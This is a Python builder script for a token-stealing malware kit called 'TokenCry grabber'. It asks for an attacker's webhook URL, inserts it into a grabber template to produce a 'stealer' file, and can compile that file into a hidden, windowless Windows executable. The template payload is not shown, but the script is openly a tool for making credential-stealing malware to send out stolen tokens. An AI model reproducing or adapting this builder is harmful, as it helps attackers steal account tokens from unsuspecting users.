import os
import sys
from colorama import Fore, init, Style

init(autoreset=True)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

clear()

logo = """
▄▄▄█████▓ ▒█████   ██ ▄█▀▓█████  ███▄    █  ▄████▄   ██▀███ ▓██   ██▓
▓  ██▒ ▓▒▒██▒  ██▒ ██▄█▒ ▓█   ▀  ██ ▀█   █ ▒██▀ ▀█  ▓██ ▒ ██▒▒██  ██▒
▒ ▓██░ ▒░▒██░  ██▒▓███▄░ ▒███   ▓██  ▀█ ██▒▒▓█    ▄ ▓██ ░▄█ ▒ ▒██ ██░
░ ▓██▓ ░ ▒██   ██░▓██ █▄ ▒▓█  ▄ ▓██▒  ▐▌██▒▒▓▓▄ ▄██▒▒██▀▀█▄   ░ ▐██▓░
  ▒██▒ ░ ░ ████▓▒░▒██▒ █▄░▒████▒▒██░   ▓██░▒ ▓███▀ ░░██▓ ▒██▒ ░ ██▒▓░
  ▒ ░░   ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒░   ▒ ▒ ░ ░▒ ▒  ░░ ▒▓ ░▒▓░  ██▒▒▒ 
    ░      ░ ▒ ▒░ ░ ░▒ ▒░ ░ ░  ░░ ░░   ░ ▒░  ░  ▒     ░▒ ░ ▒░▓██ ░▒░ 
  ░      ░ ░ ░ ▒  ░ ░░ ░    ░      ░   ░ ░ ░          ░░   ░ ▒ ▒ ░░  
             ░ ░  ░  ░      ░  ░         ░ ░ ░         ░     ░ ░     
                                           ░                 ░ ░     
"""

print(Fore.GREEN + logo)
print(f"[{Fore.CYAN}!{Style.RESET_ALL}] Welcome to {Fore.GREEN}TokenCry{Style.RESET_ALL} grabber!")

webhook_url = input(f"\n[{Fore.CYAN}?{Style.RESET_ALL}] {Fore.CYAN}➤{Style.RESET_ALL} Enter your Webhook URL: ")
name_file = input(f"\n[{Fore.CYAN}?{Style.RESET_ALL}] {Fore.CYAN}➤{Style.RESET_ALL} Enter the name of the stealer: ")

if not name_file.strip():
    name_file = "stealer"

search_text = "WEBHOOK_HERE"
replace_text = webhook_url

grabber_path = "assets/grabber.py"
output_grabber_path = f"builder/{name_file}.py"

if not os.path.exists('builder'):
    os.makedirs('builder')

with open(grabber_path, 'r', encoding="utf-8") as f:
    code = f.read()

code = code.replace(search_text, replace_text)

with open(output_grabber_path, 'w', encoding="utf-8") as output_grabber:
    output_grabber.write(code)

print(f"[{Fore.CYAN}!{Style.RESET_ALL}] {Fore.CYAN}➤{Style.RESET_ALL} Stealer file: {Fore.RED}{output_grabber_path}{Style.RESET_ALL}")

compile_to_exe = input(f"\n[{Fore.CYAN}?{Style.RESET_ALL}] {Fore.CYAN}➤{Style.RESET_ALL} Do you want to compile to .exe? (y/n): ").lower()

if compile_to_exe == "y":
    print(f"\n[{Fore.CYAN}✔{Style.RESET_ALL}] {Fore.CYAN}➤{Style.RESET_ALL} Compiling to .exe...")
    os.system(f'pyinstaller --onefile --noconsole "{output_grabber_path}"')

    exe_path = f"dist/{name_file}.exe"
    print(f"\n[{Fore.CYAN}✔{Style.RESET_ALL}] {Fore.CYAN}➤{Style.RESET_ALL} Compiled .exe file: {Fore.RED}{exe_path}{Style.RESET_ALL}")

print(f"\n[{Fore.CYAN}✔{Style.RESET_ALL}] {Fore.CYAN}➤{Style.RESET_ALL} Finished creating the token grabber script!")
